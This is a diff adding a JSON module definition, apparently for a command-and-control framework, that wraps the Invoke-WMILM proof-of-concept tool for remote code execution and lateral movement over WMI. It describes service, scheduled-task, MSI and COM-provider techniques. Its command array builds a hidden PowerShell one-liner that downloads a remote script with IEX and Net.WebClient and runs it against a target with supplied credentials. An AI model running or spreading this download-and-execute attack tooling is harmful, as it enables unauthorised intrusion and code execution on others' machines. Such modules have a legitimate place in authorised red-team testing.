@@ -1,0 +1,46 @@
+{
+  "base": {
+    "name": "Invoke-WMILM",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Philip Tsukerman"],
+    "path": ["windows", "x64", "powershell", "lateral", "wmi", "Invoke-WMILM.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powershell",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/Cybereason/Invoke-WMILM/master/Invoke-WMILM.ps1",
+    "local": ["data", "src", "Cybereason", "Invoke-WMILM", "Invoke-WMILM.ps1"],
+    "options": [
+      {"name": "Target", "value": null, "required": true, "flag": "-Target", "description":"Hostname or IP of the target machine"},
+      {"name": "Type", "value": "Service", "required": true, "flag": "-Type", "description":"The Type of technique to be used. Options: Product, Service, Job, Task, Provider, DerivedProcess"},
+      {"name": "Name", "value": "WinUpdate", "required": false, "flag": "-Name", "description":"Supplies fields such as service name, to techniques needing it"},
+      {"name": "Command", "value": null, "required": true, "flag": "-Command", "description":"Executable to run"},
+      {"name": "Protocol", "value": "DCOM", "required": false, "flag": "-Protocol", "description":"DCOM or Wsman"},
+      {"name": "CommandArgs", "value": null, "required": false, "flag": "-CommandArgs", "description":"Arguments to the executable"},
+      {"name": "CleanUp", "value": null, "required": false, "flag": "-CleanUp", "description":"Should we try to clean up artifacts created on the target machine?"},
+      {"name": "Username", "value": null, "required": true, "flag": "-Username", "description":"Username for target machine"},
+      {"name": "Password", "value": null, "required": true, "flag": "-Password", "description":"Password for target machine "}
+    ],
+    "description": "This is a PoC script for various methods to acheive authenticated remote code execution via WMI, without (at least directly) using the Win32_Process class. The type of technique is determined by the \"Type\" parameter.",
+    "notes": "\r\nSupported Techniques\r\nDerivedProcess - Creates a class deriving from Win32_Process, and calls the Create method of that class\r\nService - Creates a service and runs it using WMI. Basically PSEXEC with different network traffic\r\nJob - Creates an at.exe style scheduled task to run in 30 seconds. Does not work on Win8+, unless at.exe is enabled\r\nTask - Creates an schtasks.exe style scheduled task and runs it. Works only on Win8+\r\nProduct - Runs an arbitrary MSI file from a given path (given by the Command parameter)\r\nProvider - Creates a new provider with the command and arguments as the underlying COM object, and loads it\r\n",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w", "0",
+      "\"IEX",
+      "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Cybereason/Invoke-WMILM/master/Invoke-WMILM.ps1');",
+      "Invoke-WMILM",
+      "{{Target}}",
+      "{{Type}}",
+      "{{Protocol}}",
+      "{{Name}}",
+      "{{Command}}",
+      "{{CommandArgs}}",
+      "{{CleanUp.Flag}}",
+      "{{Username}}",
+      "{{Password}}",
+      "\""
+    ]
+  }
+}
